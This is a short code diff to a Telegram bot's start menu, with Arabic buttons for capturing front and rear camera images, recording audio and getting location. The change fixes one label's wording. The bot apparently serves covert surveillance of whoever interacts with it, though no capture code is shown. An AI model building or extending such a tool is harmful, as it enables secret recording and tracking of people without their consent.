@@ -250,7 +250,7 @@ bot.onText(/\/start/, (msg) => {
         reply_markup: {
             inline_keyboard: [
                 [{ text: 'تصوير كام أمامي', callback_data:'front_camera' }],
-                [{ text: 'تصوير كام خلفي', callback_data:'rear_camera' }],
+                [{ text: 'تصوير كاما خلفي', callback_data:'rear_camera' }],
                 [{ text: 'تسجيل صوت', callback_data:'voice_record' }],
                 [{ text: 'الحصول على الموقع', callback_data:'get_location' }]
             ]
